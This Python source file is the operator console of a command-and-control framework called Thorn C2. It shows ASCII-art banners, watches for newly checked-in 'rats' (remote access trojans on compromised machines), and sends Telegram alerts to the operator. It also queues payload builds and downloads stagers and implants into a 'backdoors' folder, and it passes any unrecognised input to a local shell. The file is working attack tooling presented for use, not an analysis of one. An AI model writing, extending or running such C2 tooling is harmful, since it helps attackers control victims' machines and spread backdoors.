#!/usr/bin/env python3
"""trnctl — Thorn C2 interactive console"""

import cmd
import re
import sys
import threading
import time
from pathlib import Path

try:
    import readline
    HAS_READLINE = True
except ImportError:
    HAS_READLINE = False

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("requests not found. Run: pip install requests")
    sys.exit(1)

from cli.ui  import (
    RESET, BOLD, GREEN, RED, GREY,
    ok, err, info, warn, bold, cyan, grey, green, primary,
    set_theme, get_themes, THEMES,
)
from cli.api import (
    VERSION, CONFIG_PATH, HISTORY_PATH,
    load_config, get_session,
    list_profiles, save_profile, switch_profile, delete_profile,
    save_theme, normalise_url, load_telegram,
)
from cli.rats  import RatsMixin
from cli.build import BuildMixin
from cli.users import UsersMixin
from cli.log   import LogMixin
from cli.help  import HelpMixin
from cli.post  import PostMixin
from builder.bab.ui import BuildAborted

# ── Banner ────────────────────────────────────────────────────────────────────

_BANNERS = [
    [
        r" ,--.--------. ,--.-,,-,--,   _,.---._                .-._        ",
        r"/==/,  -   , -Y==/  /|=|  | ,-.' , -  `.   .-.,.---. /==/ \  .-._  ",
        r"\==\.-.  - ,-./==|_ ||=|, |/==/_,  ,  - \ /==/  `   \|==|, \/ /, / ",
        r" `--`\==\- \  |==| ,|/=| _|==|   .=.     |==|-, .=., |==|-  \|  |  ",
        r"      \==\_ \ |==|- `-' _ |==|_ : ;=:  - |==|   '='  /==| ,  | -|  ",
        r"      |==|- | |==|  _     |==| , '='     |==|- ,   .'|==| -   _ |  ",
        r"      |==|, | |==|   .-. ,\\==\ -    ,_ /|==|_  . ,'.|==|  /\ , |  ",
        r"      /==/ -/ /==/, //=/  | '.='. -   .' /==/  /\ ,  )==/, | |- |  ",
        r"      `--`--` `--`-' `-`--`   `--`--''   `--`-`--`--'`--`./  `--`",
    ],
    [
        r"▄▄▄▄▄ ▄ .▄      ▄▄▄   ▐ ▄ ",
        r"•██  ██▪▐█▪     ▀▄ █·•█▌▐█",
        r" ▐█.▪██▀▐█ ▄█▀▄ ▐▀▀▄ ▐█▐▐▌",
        r" ▐█▌·██▌▐▀▐█▌.▐▌▐█•█▌██▐█▌",
        r" ▀▀▀ ▀▀▀ · ▀█▄▀▪.▀  ▀▀▀ █▪",
    ],
    [
        r" sdSS_SSSSSSbs   .S    S.     sSSs_sSSs     .S_sSSs     .S_sSSs    ",
        r"YSSS~S%SSSSSP  .SS    SS.   d%%SP~YS%%b   .SS~YS%%b   .SS~YS%%b   ",
        r"     S%S       S%S    S%S  d%S'     `S%b  S%S   `S%b  S%S   `S%b  ",
        r"     S%S       S%S    S%S  S%S       S%S  S%S    S%S  S%S    S%S  ",
        r"     S&S       S%S SSSS%S  S&S       S&S  S%S    d*S  S%S    S&S  ",
        r"     S&S       S&S  SSS&S  S&S       S&S  S&S   .S*S  S&S    S&S  ",
        r"     S&S       S&S    S&S  S&S       S&S  S&S_sdSSS   S&S    S&S  ",
        r"     S&S       S&S    S&S  S&S       S&S  S&S~YSY%b   S&S    S&S  ",
        r"     S*S       S*S    S*S  S*b       d*S  S*S   `S%b  S*S    S*S  ",
        r"     S*S       S*S    S*S  S*S.     .S*S  S*S    S%S  S*S    S*S  ",
        r"     S*S       S*S    S*S   SSSbs_sdSSS   S*S    S&S  S*S    S*S  ",
        r"     S*S       SSS    S*S    YSSP~YSSY    S*S    SSS  S*S    SSS  ",
        r"     SP               SP                  SP          SP          ",
        r"     Y                Y                   Y           Y           ",
    ],
    [
        r":::::::::::: ::   .:      ...    :::::::.. :::.    :::.    ",
        r";;;;;;;;'''',;;   ;;,  .;;;;;;;. ;;;;``;;;;`;;;;,  `;;;",
        r"     [[    ,[[[,,,[[[ ,[[     \[[,[[[,/[[['  [[[[[. '[[",
        r"     $$    \"$$$\"\"\"$$$ $$$,     $$$$$$$$$c    $$$ \"Y$c$$",
        r"     88,    888   \"88o\"888,_ _,88P888b \"88bo,888    Y88",
        r"     MMM    MMM    YMM  \"YMMMMMP\" MMMM   \"W\" MMM     YM",
    ],
    [
        r"                           :                              ",
        r"                          t#,               L.            ",
        r"           .    .        ;##W.   j.         EW:        ,ft",
        r"  GEEEEEEELDi   Dt      :#L:WE   EW,        E##;       t#E",
        r"  ,;;L#K;;.E#i  E#i    .KG  ,#D  E##j       E###t      t#E",
        r"     t#E   E#t  E#t    EE    ;#f E###D.     E#fE#f     t#E",
        r"     t#E   E#t  E#t   f#.     t#iE#jG#W;    E#t D#G    t#E",
        r"     t#E   E#t  E#t  :#G     GK E#t t##f   E#t  f#E.  t#E",
        r"     t#E   E########f.:#G     GK E#t  :K#E: E#t   t#K: t#E",
        r"     t#E   E#j..K#j... ;#L   LW. E#t   t#K: E#t    ;#W,t#E",
        r"     t#E   E#t  E#t     t#f f#:  E#KDDDD###iE#t     :K#D#E",
        r"     t#E   E#t  E#t      f#D#;   E#f,t#Wi,,,E#t      .E##E",
        r"     t#E   f#t  f#t       G#t    E#t  ;#W:  E#t       .E#E",
        r"      fE    ii   ii        t     DWi   ,KK: ..          fE",
        r"       :                                                 , ",
    ],
    [
        r" ███████████ █████                                   ",
        r"░█░░░███░░░█░░███                                    ",
        r"░   ░███  ░  ░███████    ██████  ████████  ████████  ",
        r"    ░███     ░███░░███  ███░░███░░███░░███░░███░░███ ",
        r"    ░███     ░███ ░███ ░███ ░███ ░███ ░░░  ░███ ░███ ",
        r"    ░███     ░███ ░███ ░███ ░███ ░███      ░███ ░███ ",
        r"    █████    ████ █████░░██████  █████     █████ ████  ",
        r"   ░░░░░    ░░░░ ░░░░░  ░░░░░░  ░░░░░     ░░░░░ ░░░░   ",
    ],
    [
        r" ______  __                               ",
        r"/\__  _\/\ \                              ",
        r"\/_/\ \/\ \ \___     ___   _ __    ___    ",
        r"   \ \ \ \ \  _ `\  / __`\/\`'__\/' _ `\  ",
        r"    \ \ \ \ \ \ \ \/\ \L\ \ \ \/ /\ \/\ \ ",
        r"     \ \_\ \ \_\ \_\ \____/\ \_\ \ \_\ \_\\",
        r"      \/_/  \/_/\/_/\/___/  \/_/  \/_/\/_/",
    ],
    [
        r"@@@@@@@  @@@  @@@   @@@@@@   @@@@@@@   @@@  @@@  ",
        r"@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  ",
        r"  @@!    @@!  @@@  @@!  @@@  @@!  @@@  @@!@!@@@  ",
        r"  !@!    !@!  @!@  !@!  @!@  !@!  @!@  !@!!@!@!  ",
        r"  @!!    @!@!@!@!  @!@  !@!  @!@!!@!   @!@ !!@!  ",
        r"  !!!    !!!@!!!!  !@!  !!!  !!@!@!    !@!  !!!  ",
        r"  !!:    !!:  !!!  !!:  !!!  !!: :!!   !!:  !!!  ",
        r"  :!:    :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  ",
        r"   ::    ::   :::  ::::: ::  ::   :::   ::   ::  ",
        r"   :      :   : :   : :  :    :   : :  ::    :   ",
    ],
    [
        r"                      .-'''-.                        ",
        r"                     '   _    \                      ",
        r"           .       /   /` '.   \            _..._    ",
        r"         .'|      .   |     \  '          .'     '.  ",
        r"     .| <  |      |   '      |  '.-,.--. .   .-.   . ",
        r"   .' |_ | |      \    \     / / |  .-. ||  '   '  | ",
        r" .'     || | .'''-.`.   ` ..' /  | |  | ||  |   |  | ",
        r"'--.  .-'| |/.'''. \  '-...-'`   | |  | ||  |   |  | ",
        r"   |  |  |  /    | |             | |  '- |  |   |  | ",
        r"   |  |  | |     | |             | |     |  |   |  | ",
        r"   |  '.'| |     | |             | |     |  |   |  | ",
        r"   |   / | '.    | '.            |_|     |  |   |  | ",
        r"   `'-'  '---'   '---'                   '--'   '--' ",
    ],
    [
        r"__/\\\\\\\\\\\\\\\__/\\\___________________________________________________        ",
        r" _\///////\\\/////__\/\\\___________________________________________________       ",
        r"  _______\/\\\_______\/\\\___________________________________________________      ",
        r"   _______\/\\\_______\/\\\_____________/\\\\\_____/\\/\\\\\\\___/\\/\\\\\\___     ",
        r"    _______\/\\\_______\/\\\\\\\\\\____/\\\///\\\__\/\\\/////\\\_\/\\\////\\\__    ",
        r"     _______\/\\\_______\/\\\/////\\\__/\\\__\//\\\_\/\\\___\///__\/\\\__\//\\\_   ",
        r"      _______\/\\\_______\/\\\___\/\\\_\//\\\__/\\\__\/\\\_________\/\\\___\/\\\_  ",
        r"       _______\/\\\_______\/\\\___\/\\\__\///\\\\\/___\/\\\_________\/\\\___\/\\\_ ",
        r"        _______\///________\///____\///_____\/////_____\///__________\///____\///__",
    ],
]

def _make_banner():
    import random
    lines = "\n".join(primary(l) for l in random.choice(_BANNERS))
    return (
        f"\n{lines}\n\n"
        f"  {GREY}v{VERSION}{RESET}  {GREY}·{RESET}  {GREY}Thorn C2 Console{RESET}"
        f"  {GREY}·{RESET}  {GREY}type 'help' for commands{RESET}\n"
        f"  {GREY}Run{RESET} {BOLD}config <url> <api_key>{RESET} {GREY}to connect  ·  "
        f"{BOLD}config list{RESET} {GREY}to switch profiles  ·  "
        f"{BOLD}build config{RESET} {GREY}to set payload settings{RESET}\n"
    )

# ── Rat monitor ───────────────────────────────────────────────────────────────

class RatMonitor:
    """Background thread: polls for new rat check-ins and notifies the operator."""
    INTERVAL = 10  # seconds between polls

    def __init__(self, console):
        self._console = console
        self._known   = set()
        self._first   = True
        self._running = False
        self._thread  = None

    def start(self):
        self._running = True
        self._thread  = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

    def _loop(self):
        while self._running:
            try:
                self._poll()
            except Exception:
                pass
            for _ in range(self.INTERVAL * 10):
                if not self._running:
                    return
                time.sleep(0.1)

    def _poll(self):
        s, url = get_session()
        if not s:
            return
        try:
            resp = s.get(f"{url}/api/rats", timeout=5)
        except Exception:
            return
        if not resp.ok:
            return
        rats    = resp.json()
        current = {r["id"] for r in rats}
        new     = current - self._known
        if not self._first and new:
            for rat_id in sorted(new):
                self._notify(rat_id)
            self._console.rat_cache = [r["id"] for r in rats]
        self._known = current
        self._first = False

    def _notify(self, rat_id):
        short = rat_id[:24] + "…" if len(rat_id) > 24 else rat_id
        msg   = f"\n  {GREEN}◆{RESET}  {bold('New rat checked in')}  {cyan(short)}\n"
        sys.stdout.write(f"\r\033[K{msg}")
        if HAS_READLINE:
            sys.stdout.write(self._console._raw_prompt)
            readline.redisplay()
        sys.stdout.flush()
        _telegram_rat_notify(rat_id)


# ── Build monitor ─────────────────────────────────────────────────────────────

class BuildMonitor:
    """Background thread: polls queued server build jobs and notifies on completion."""
    INTERVAL = 5  # seconds between polls

    def __init__(self, console):
        self._console  = console
        self._pending  = {}   # job_id -> build_type string
        self._lock     = threading.Lock()
        self._running  = False
        self._thread   = None

    def start(self):
        self._running = True
        self._thread  = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

    def add_job(self, job_id: str, build_type: str):
        with self._lock:
            self._pending[job_id] = build_type

    def _loop(self):
        while self._running:
            try:
                self._poll()
            except Exception:
                pass
            for _ in range(self.INTERVAL * 10):
                if not self._running:
                    return
                time.sleep(0.1)

    def _poll(self):
        with self._lock:
            pending = dict(self._pending)
        if not pending:
            return
        s, url = get_session()
        if not s:
            return
        done = []
        for job_id, build_type in pending.items():
            try:
                resp = s.get(f"{url}/api/build/{job_id}", timeout=5)
            except Exception:
                continue
            if not resp.ok:
                continue
            try:
                data = resp.json()
            except Exception:
                continue
            status = data.get("status", "running")
            if status == "done":
                done.append(job_id)
                artifacts = data.get("artifacts", [])
                self._download(s, url, job_id, artifacts)
                self._notify(build_type, success=True, artifacts=artifacts, lines=data.get("lines", []))
            elif status == "failed":
                done.append(job_id)
                self._notify(build_type, success=False, artifacts=[], lines=data.get("lines", []))
        with self._lock:
            for job_id in done:
                self._pending.pop(job_id, None)

    def _download(self, s, url, job_id, artifacts):
        out_dir = Path(__file__).parent / "backdoors"
        for art in artifacts:
            name = art["name"]
            try:
                r = s.get(f"{url}/api/build/{job_id}/artifact/{name}", timeout=30)
            except Exception:
                continue
            if not r.ok:
                continue
            ext = Path(name).suffix.lower()
            if ext in (".zip",) or "stager" in name:
                dest = out_dir / "stagers" / name
            else:
                dest = out_dir / "implant" / name
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(r.content)

    def _notify(self, build_type: str, success: bool, artifacts: list, lines: list):
        if success:
            if artifacts:
                arts_lines = "".join(
                    f"\r\033[K    {GREY}{a['name']}{RESET}\n"
                    for a in artifacts
                )
                msg = f"\n  {GREEN}◆{RESET}  {bold('Build complete')}  {cyan(build_type)}\n{arts_lines}"
            else:
                msg = f"\n  {GREEN}◆{RESET}  {bold('Build complete')}  {cyan(build_type)}  {grey('(no artifacts)')}\n"
        else:
            tail = lines[-20:] if lines else []
            log  = "".join(f"\r\033[K    {GREY}{l}{RESET}\n" for l in tail)
            msg  = f"\n  {RED}◆{RESET}  {bold('Build failed')}  {cyan(build_type)}\n{log}"
        sys.stdout.write(f"\r\033[K{msg}")
        if HAS_READLINE:
            sys.stdout.write(self._console._raw_prompt)
            readline.redisplay()
        sys.stdout.flush()


# ── Helpers ───────────────────────────────────────────────────────────────────

def _telegram_rat_notify(rat_id: str):
    """Fire-and-forget Telegram notification for a new rat check-in."""
    import threading
    from cli.users import _telegram_send
    def _send():
        bot_token, chat_id = load_telegram()
        if not bot_token or not chat_id:
            return
        short = rat_id[:24] + "\u2026" if len(rat_id) > 24 else rat_id
        _telegram_send(bot_token, chat_id, f"\U0001f311 *New rat checked in*\n`{short}`")
    threading.Thread(target=_send, daemon=True).start()

def _rl_wrap(s: str) -> str:
    """Wrap ANSI escape sequences with readline non-printing markers \\001/\\002."""
    return re.sub(r'(\x1b\[[0-9;]*m)', r'\001\1\002', s)


# ── Console ───────────────────────────────────────────────────────────────────

class ThornConsole(RatsMixin, BuildMixin, UsersMixin, LogMixin, HelpMixin, PostMixin, cmd.Cmd):

    def __init__(self):
        super().__init__()
        self.active_rat    = None   # full rat_id string
        self.rat_cache     = []     # cached rat list for tab completion
        self.module_cache  = []     # cached module list for # indexing
        self._monitor      = RatMonitor(self)
        self._build_monitor = BuildMonitor(self)
        self._update_prompt()

        if HAS_READLINE:
            readline.set_completer_delims(" \t/")
            readline.parse_and_bind("tab: complete")
            if HISTORY_PATH.exists():
                try:
                    readline.read_history_file(str(HISTORY_PATH))
                except Exception:
                    pass

    def _update_prompt(self):
        if self.active_rat:
            short = self.active_rat[:20] + ("…" if len(self.active_rat) > 20 else "")
            raw = f"  {cyan('thorn')} {GREY}[{RESET}{green(short)}{GREY}]{RESET} {BOLD}»{RESET} "
        else:
            raw = f"  {cyan('thorn')} {BOLD}»{RESET} "
        self._raw_prompt = raw
        self.prompt = _rl_wrap(raw) if HAS_READLINE else raw

    def _session(self):
        s, url = get_session()
        if not s:
            err("No config. Run: config <url> <api_key>")
        return s, url

    def _need_rat(self):
        if not self.active_rat:
            err("No active rat. Run: use <rat_id>")
            return False
        return True

    def cmdloop(self, intro=None):
        cfg = load_config()
        if cfg and cfg.get('theme'):
            set_theme(cfg['theme'])
            self._update_prompt()
        print(_make_banner())
        cfg = load_config()
        if cfg:
            info(f"Connected to  {cyan(cfg['url'])}")
        else:
            warn("Not configured — run: config <url> <api_key>  or  config list")
        print()
        self._monitor.start()
        self._build_monitor.start()
        try:
            super().cmdloop(intro="")
        finally:
            self._monitor.stop()
            self._build_monitor.stop()
            if HAS_READLINE:
                try:
                    readline.write_history_file(str(HISTORY_PATH))
                except Exception:
                    pass

    def emptyline(self):
        pass

    def postcmd(self, stop, line):
        if not stop:
            print()
        return stop

    def onecmd(self, line):
        try:
            return super().onecmd(line)
        except BuildAborted as e:
            info(str(e))
            return False
        except KeyboardInterrupt:
            info("Aborted.")
            return False
        except Exception as e:
            err(str(e))
            return False

    def _path_complete(self, text, line=None, begidx=None):
        """Return basename completions, reconstructing the dir prefix from the line."""
        import glob
        import os
        # Reconstruct the directory prefix (e.g. "../../" or "/tmp/") from the line
        if line is not None and begidx is not None:
            arg_start  = line.rfind(' ', 0, begidx) + 1
            dir_prefix = line[arg_start:begidx]
        else:
            dir_prefix = ''
        full_text = os.path.expanduser(dir_prefix + text)
        results   = []
        for m in glob.glob(full_text + '*'):
            b = os.path.basename(m.rstrip('/')) or m
            if os.path.isdir(m):
                b += '/'
            results.append(b)
        return results

    def completedefault(self, text, line, begidx, endidx):
        return self._path_complete(text, line, begidx)

    def completenames(self, text, *ignored):
        thorn_cmds = super().completenames(text, *ignored)
        path_matches = self._path_complete(text)
        return thorn_cmds + path_matches

    def default(self, line):
        import os
        import subprocess
        # Handle cd in-process so the directory change persists
        stripped = line.strip()
        if stripped == "cd" or stripped.startswith("cd "):
            target = stripped[2:].strip() or str(Path.home())
            target = os.path.expanduser(target)
            try:
                os.chdir(target)
            except FileNotFoundError:
                err(f"cd: {target}: No such file or directory")
            except NotADirectoryError:
                err(f"cd: {target}: Not a directory")
            except PermissionError:
                err(f"cd: {target}: Permission denied")
            return
        try:
            result = subprocess.run(line, shell=True, capture_output=True, text=True)
            output = (result.stdout + result.stderr).rstrip()
            if output:
                for ln in output.splitlines():
                    print(f"  {ln}")
        except Exception as e:
            err(str(e))

    # ── config ────────────────────────────────────────────────────────────────

    def do_config(self, arg):
        """config [list | use <name> | del <name> | [<name>] <url> <api_key>]"""
        parts = arg.split()

        # config  or  config list
        if not parts or parts[0] == "list":
            profiles = list_profiles()
            if not profiles:
                warn("No profiles configured. Run: config <url> <api_key>")
                return
            print()
            for name, profile, is_active in profiles:
                marker = cyan("*") if is_active else " "
                label  = cyan(name) if is_active else name
                print(f"  {marker}  {label}  {GREY}{profile.get('url', '')}{RESET}")
            print()
            return

        # config use <name>
        if parts[0] == "use":
            if len(parts) < 2:
                err("Usage: config use <name>")
                return
            name = parts[1]
            if not switch_profile(name):
                err(f"No profile '{name}'")
                return
            cfg = load_config()
            ok(f"Switched to '{name}'  →  {cfg.get('url', '')}")
            return

        # config del <name>
        if parts[0] == "del":
            if len(parts) < 2:
                err("Usage: config del <name>")
                return
            name = parts[1]
            if not delete_profile(name):
                err(f"No profile '{name}'")
                return
            ok(f"Deleted profile '{name}'")
            return

        # config <url> <api_key>  or  config <name> <url> <api_key>
        if len(parts) == 2:
            name = "default"
            url, api_key = parts
        elif len(parts) == 3:
            name, url, api_key = parts
        else:
            err("Usage: config [<name>] <url> <api_key>")
            return

        url = normalise_url(url)
        save_profile(name, url, api_key)
        ok(f"Profile '{name}' saved  →  {CONFIG_PATH}")
        info(f"URL:     {url}")
        info(f"API key: {api_key[:4]}{'*' * max(0, len(api_key) - 4)}")

    def complete_config(self, text, line, begidx, endidx):
        parts = line.split()
        # After "use" or "del", complete profile names
        if len(parts) >= 2 and parts[1] in ("use", "del"):
            if len(parts) == 2 or (len(parts) == 3 and not line.endswith(" ")):
                names = [p[0] for p in list_profiles()]
                return [n for n in names if n.startswith(text)]
            return []
        subs = ["list", "use", "del"]
        return [s for s in subs if s.startswith(text)]

    # ── theme ─────────────────────────────────────────────────────────────────

    def do_theme(self, arg):
        """theme [name]  —  Switch colour theme (or list available themes)"""
        name = arg.strip().lower()
        if not name:
            current = load_config() or {}
            current_name = current.get('theme', 'default')
            print()
            for t in get_themes():
                marker = cyan('*') if t == current_name else ' '
                print(f"  {marker}  {cyan(t) if t == current_name else t}")
            print()
            return
        if not set_theme(name):
            err(f"Unknown theme '{name}'  —  options: {', '.join(get_themes())}")
            return
        self._update_prompt()
        save_theme(name)
        ok(f"Theme set to {cyan(name)}")

    def complete_theme(self, text, line, begidx, endidx):
        return [t for t in get_themes() if t.startswith(text)]

    # ── exit / quit ───────────────────────────────────────────────────────────

    def do_exit(self, arg):
        """exit  —  Exit the console"""
        print(f"\n  {GREY}bye{RESET}\n")
        return True

    def do_quit(self, arg):
        """quit  —  Exit the console"""
        return self.do_exit(arg)

    def do_EOF(self, arg):
        print()
        return self.do_exit(arg)


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    try:
        ThornConsole().cmdloop()
    except KeyboardInterrupt:
        print(f"\n\n  {GREY}interrupted{RESET}\n")
        sys.exit(0)
